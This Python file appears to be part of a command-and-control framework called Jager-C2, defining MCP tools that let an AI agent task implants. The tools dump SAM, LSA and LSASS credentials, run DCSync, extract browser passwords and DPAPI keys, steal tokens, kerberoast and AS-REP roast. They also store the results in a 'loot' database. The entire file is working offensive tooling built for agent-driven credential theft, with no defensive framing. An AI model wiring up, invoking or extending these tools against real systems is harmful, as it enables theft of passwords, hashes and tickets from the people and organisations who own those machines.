"""Credential access tools for Jager-C2 MCP server."""

from typing import Any, Dict

TOOLS = [
    {
        "name": "cred_dump_sam",
        "description": "Dump SAM database (local account hashes). Requires SYSTEM.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "cred_dump_lsa",
        "description": "Dump LSA secrets (service account passwords, DPAPI keys). Requires SYSTEM.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "cred_dump_lsass",
        "description": "Dump LSASS process memory for credentials. Requires SYSTEM/SeDebugPrivilege.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "method": {
                    "type": "string",
                    "enum": ["minidump", "direct", "nanodump", "handledup"],
                    "default": "nanodump"
                }
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "cred_dump_dcsync",
        "description": "DCSync - replicate AD credentials via MS-DRSR. Requires Replicating Directory Changes.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target_user": {"type": "string", "description": "User to sync (empty = all)"},
                "domain": {"type": "string"},
                "dc_ip": {"type": "string"}
            },
            "required": ["session_id", "domain", "dc_ip"]
        }
    },
    {
        "name": "cred_dump_credman",
        "description": "Dump Windows Credential Manager entries",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "cred_dump_chrome",
        "description": "Extract Chrome/Edge saved passwords (DPAPI encrypted)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "browser": {
                    "type": "string",
                    "enum": ["chrome", "edge", "firefox", "all"],
                    "default": "all"
                }
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "cred_dump_dpapi",
        "description": "Extract DPAPI masterkeys and decrypt protected data",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target_user": {"type": "string", "description": "Target user SID (empty = current)"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "cred_dump_tickets",
        "description": "Extract Kerberos tickets from memory (TGT/TGS)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "export_kirbi": {"type": "boolean", "default": True}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "cred_token_steal",
        "description": "Steal and impersonate a token from another process",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target_pid": {"type": "integer"}
            },
            "required": ["session_id", "target_pid"]
        }
    },
    {
        "name": "cred_token_make",
        "description": "Create a new token with provided credentials (make_token)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "domain": {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"}
            },
            "required": ["session_id", "domain", "username", "password"]
        }
    },
    {
        "name": "cred_token_revert",
        "description": "Revert to original process token",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "cred_kerberoast",
        "description": "Request TGS tickets for service accounts (offline cracking)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target_spn": {"type": "string", "description": "Specific SPN (empty = all)"},
                "domain": {"type": "string"},
                "dc_ip": {"type": "string"}
            },
            "required": ["session_id", "domain"]
        }
    },
    {
        "name": "cred_asreproast",
        "description": "Request AS-REP for accounts without pre-auth",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target_users": {"type": "array", "items": {"type": "string"}},
                "domain": {"type": "string"},
                "dc_ip": {"type": "string"}
            },
            "required": ["session_id", "domain"]
        }
    },
    {
        "name": "cred_vault_list",
        "description": "List all credentials stored in the C2 loot database",
        "inputSchema": {
            "type": "object",
            "properties": {
                "domain_filter": {"type": "string"},
                "type_filter": {"type": "string"}
            }
        }
    },
    {
        "name": "cred_vault_add",
        "description": "Manually add a credential to the vault",
        "inputSchema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string"},
                "username": {"type": "string"},
                "credential_type": {"type": "string", "enum": ["password", "ntlm", "aes256", "ticket", "certificate"]},
                "credential_data": {"type": "string"},
                "source": {"type": "string"}
            },
            "required": ["username", "credential_type", "credential_data"]
        }
    },
]


async def handle(tool_name: str, args: Dict[str, Any], client) -> Dict[str, Any]:
    """Handle credential tool calls."""
    try:
        from task_client import queue_task
        from task_types import TaskType
    except ImportError:
        from ..task_client import queue_task
        from ..task_types import TaskType

    session_id = args.get("session_id", "")

    task_map = {
        "cred_dump_sam": (TaskType.TASK_HASHDUMP, {"mode": "sam"}),
        "cred_dump_lsa": (TaskType.TASK_HASHDUMP, {"mode": "lsa"}),
        "cred_dump_lsass": (TaskType.TASK_HASHDUMP, {"mode": "lsass", "method": args.get("method", "nanodump")}),
        "cred_dump_dcsync": (
            TaskType.TASK_HASHDUMP,
            {
                "mode": "dcsync",
                "domain": args.get("domain", ""),
                "dc_ip": args.get("dc_ip", ""),
                "target_user": args.get("target_user", ""),
            },
        ),
        "cred_dump_credman": (TaskType.TASK_HASHDUMP, {"mode": "credman"}),
        "cred_dump_chrome": (TaskType.TASK_BROWSER_CREDS, {"browser": args.get("browser", "all")}),
        "cred_dump_dpapi": (TaskType.TASK_DPAPI, {"target_user": args.get("target_user", "")}),
        "cred_dump_tickets": (TaskType.TASK_KERBEROS_TICKETS, {"export_kirbi": args.get("export_kirbi", True)}),
        "cred_token_steal": (TaskType.TASK_TOKEN_STEAL, {"target_pid": args.get("target_pid", 0)}),
        "cred_token_make": (
            TaskType.TASK_MAKE_TOKEN,
            {
                "domain": args.get("domain", ""),
                "username": args.get("username", ""),
                "password": args.get("password", ""),
            },
        ),
        "cred_token_revert": (TaskType.TASK_REVERT_TOKEN, {}),
        "cred_kerberoast": (
            TaskType.TASK_KERBEROS_TICKETS,
            {
                "mode": "kerberoast",
                "domain": args.get("domain", ""),
                "dc_ip": args.get("dc_ip", ""),
                "target_spn": args.get("target_spn", ""),
            },
        ),
        "cred_asreproast": (
            TaskType.TASK_KERBEROS_TICKETS,
            {
                "mode": "asreproast",
                "domain": args.get("domain", ""),
                "dc_ip": args.get("dc_ip", ""),
                "target_users": args.get("target_users", []),
            },
        ),
    }

    if tool_name in task_map:
        task_type, payload = task_map[tool_name]
        return await queue_task(client, session_id, task_type, payload)

    if tool_name == "cred_vault_list":
        return await client.list_credentials(
            args.get("domain_filter", ""),
            args.get("type_filter", "")
        )

    if tool_name == "cred_vault_add":
        return await client.add_credential(args)

    return {"error": f"Unknown tool: {tool_name}"}
